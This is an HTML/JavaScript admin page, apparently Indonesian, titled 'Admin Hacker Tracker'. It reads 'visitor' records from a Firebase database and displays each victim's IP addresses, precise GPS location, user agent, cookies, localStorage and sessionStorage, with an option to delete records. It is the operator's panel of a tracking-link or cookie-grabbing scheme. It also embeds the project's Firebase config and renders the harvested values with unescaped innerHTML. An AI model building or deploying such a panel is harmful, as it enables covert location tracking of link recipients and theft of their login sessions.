<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Admin Hacker Tracker</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Courier New', monospace;
      background: black;
      color: #00FF00;
      overflow-x: hidden;
    }
    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: -1;
    }
    h1 {
      text-align: center;
      margin-top: 20px;
    }
    #buttons {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 20px;
      gap: 10px;
    }
    button {
      background-color: #003300;
      border: 1px solid #00FF00;
      color: #00FF00;
      padding: 8px 16px;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover {
      background-color: #005500;
    }
    .info-card {
      border: 1px solid #00FF00;
      border-radius: 12px;
      padding: 12px;
      margin: 10px auto;
      max-width: 600px;
      background: rgba(0, 255, 0, 0.1);
      font-size: 14px;
    }
    .select-remove {
      margin: 20px auto;
      text-align: center;
    }
    select {
      background: black;
      color: #00FF00;
      border: 1px solid #00FF00;
      padding: 5px 10px;
      font-family: 'Courier New';
      border-radius: 6px;
    }
  </style>
</head>
<body>
  <canvas id="matrixCanvas"></canvas>
  <h1>DASHBOARD TRACKER LINK</h1>
  <div class="select-remove">
    <label for="entrySelect">Hapus Data Pengunjung:</label>
    <select id="entrySelect">
      <option value="">Pilih Data</option>
    </select>
    <button onclick="hapusData()">Hapus</button>
  </div>
  <div id="buttons"></div>

  <script>
    // Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
      authDomain: "xr-social-53646.firebaseapp.com",
      databaseURL: "https://xr-social-53646-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "xr-social-53646",
      storageBucket: "xr-social-53646.appspot.com",
      messagingSenderId: "55685443011",
      appId: "1:55685443011:web:ef0f9de8e329d24d512176",
      measurementId: "G-LTMZD79ZWX"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const buttonsContainer = document.getElementById('buttons');
    const entrySelect = document.getElementById('entrySelect');

    function createInfoCard(data, number, key) {
      const btn = document.createElement('button');
      btn.innerText = `Informasi #${number}`;
      btn.onclick = () => {
        const existing = document.getElementById('info-' + key);
        if (existing) {
          existing.remove();
        } else {
          const card = document.createElement('div');
          card.className = 'info-card';
          card.id = 'info-' + key;
          card.innerHTML = `
            <div style="margin-bottom: 10px;">
              <strong>🕒 Waktu:</strong> ${data.timestamp}<br>
              <strong>🌐 IP Publik:</strong> ${data.ip}<br>
              <strong>🏠 IP Lokal:</strong> ${data.localIP || '-'}<br>
            </div>
            <div style="margin-bottom: 10px;">
              <strong>📍 Lokasi:</strong><br>
              Latitude: ${data.latitude || '-'}<br>
              Longitude: ${data.longitude || '-'}<br>
              Akurasi: ${data.accuracy || '-'}
            </div>
            <div style="margin-bottom: 10px;">
              <strong>🧭 Referer:</strong> ${data.referer || '-'}<br>
              <strong>🧪 User Agent:</strong><br>
              <div style="white-space: pre-wrap;">${data.userAgent}</div>
            </div>
            <div style="margin-bottom: 10px;">
              <strong>🍪 Cookies:</strong><br>
              <div style="white-space: pre-wrap;">${data.cookies}</div>
            </div>
            <div style="margin-bottom: 10px;">
              <strong>📦 LocalStorage:</strong><br>
              <div style="white-space: pre-wrap;">${data.localStorage}</div>
            </div>
            <div style="margin-bottom: 10px;">
              <strong>💾 SessionStorage:</strong><br>
              <div style="white-space: pre-wrap;">${data.sessionStorage}</div>
            </div>
          `;
          btn.insertAdjacentElement('afterend', card);
        }
      };
      buttonsContainer.appendChild(btn);

      const option = document.createElement('option');
      option.value = key;
      option.text = `#${number}`;
      entrySelect.appendChild(option);
    }

    function hapusData() {
      const selected = entrySelect.value;
      if (selected) {
        db.ref('visitors/' + selected).remove();
        document.getElementById('info-' + selected)?.remove();
        location.reload();
      }
    }

    db.ref('visitors').once('value', snapshot => {
      const data = snapshot.val();
      if (data) {
        let count = 1;
        Object.entries(data).forEach(([key, val]) => {
          createInfoCard(val, count, key);
          count++;
        });
      }
    });

    // CMATRIX BACKGROUND
    const canvas = document.getElementById("matrixCanvas");
    const ctx = canvas.getContext("2d");
    canvas.height = window.innerHeight;
    canvas.width = window.innerWidth;

    const katakana = "アカサタナハマヤラワンアイウエオ";
    const latin = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const nums = "0123456789";
    const alphabet = (katakana + latin + nums).split("");

    const fontSize = 14;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);

    function draw() {
      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.fillStyle = "#0F0";
      ctx.font = fontSize + "px monospace";

      drops.forEach((y, x) => {
        const text = alphabet[Math.floor(Math.random() * alphabet.length)];
        ctx.fillText(text, x * fontSize, y * fontSize);

        if (y * fontSize > canvas.height && Math.random() > 0.975) {
          drops[x] = 0;
        }

        drops[x]++;
      });
    }

    setInterval(draw, 33);
  </script>
</body>
</html>
